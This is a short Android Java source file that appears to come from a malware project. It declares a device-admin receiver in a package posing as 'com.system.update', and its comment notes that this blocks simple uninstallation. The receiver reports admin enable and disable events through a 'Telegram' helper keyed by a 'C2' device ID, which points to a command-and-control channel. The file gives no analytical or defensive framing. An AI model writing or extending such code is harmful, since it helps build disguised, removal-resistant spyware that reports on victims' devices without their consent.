package com.system.update;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

/** Device-admin component — when active, uninstall requires deactivating admin first. */
public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        Telegram.reportEvent(C2.getDeviceId(), "device_admin_enabled");
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Telegram.reportEvent(C2.getDeviceId(), "device_admin_disabled");
    }
}
